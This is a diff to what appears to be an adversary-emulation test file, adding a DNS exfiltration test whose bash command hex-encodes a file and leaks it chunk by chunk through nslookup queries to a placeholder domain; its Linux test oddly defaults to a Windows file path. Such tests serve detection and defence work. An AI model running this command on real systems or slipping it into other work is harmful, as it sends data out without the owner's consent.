@@ -67,6 +67,26 @@ atomic_tests:
       
           cat output_file | cut -d "A" -f 2 | cut -d " " -f 2 | cut -d "." -f 1 | sort | uniq | xxd -p -r
     name: manual
+- name: Exfiltration Over Alternative Protocol - DNS (Automated)
+  description: |
+    Exfiltration of specified file over DNS protocol.(Automated)
+  supported_platforms:
+  - linux
+  input_arguments:
+    input_file:
+      description: Path to file to exfiltrate
+      type: Path
+      default: C:\Windows\System32\notepad.exe
+    exfil_domain:
+      description: Domain to exfilitrate to
+      type: String
+      default: example.com
+  executor:
+    command: |
+       cat #{input_file}  | xxd -g 0 | awk '{ print $2 }' | xargs -t -n 1 -I '{}' nslookup '{}'.#{exfil_domain}
+    name: bash
+
+
 - name: Exfiltration Over Alternative Protocol - HTTP
   auto_generated_guid: 6aa58451-1121-4490-a8e9-1dada3f1c68c
   description: |
